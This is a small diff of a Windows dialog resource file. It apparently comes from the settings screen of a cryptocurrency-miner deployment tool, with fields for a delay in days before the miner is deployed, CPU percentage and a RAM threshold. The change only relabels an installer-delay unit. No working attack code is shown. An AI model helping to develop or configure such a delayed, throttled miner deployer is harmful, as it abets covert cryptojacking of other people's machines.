@@ -92,7 +92,7 @@ BEGIN
     LTEXT           "Min.",IDC_STATIC,98,194,14,8
     LTEXT           "Max.",IDC_STATIC,98,207,17,8
     GROUPBOX        "Delay before deploy miner (days)",IDC_STATIC,96,181,134,40
-    GROUPBOX        "Installer delay (seconds)",IDC_STATIC,8,181,88,40
+    GROUPBOX        "Installer delay (milisec)",IDC_STATIC,8,181,88,40
     GROUPBOX        "Minimum RAM for light mode(Mb)",IDC_STATIC,7,220,111,29
     EDITTEXT        IDC_EDIT27,123,230,27,14,ES_AUTOHSCROLL | ES_NUMBER
     GROUPBOX        "CPU(%)",IDC_STATIC,118,219,36,30
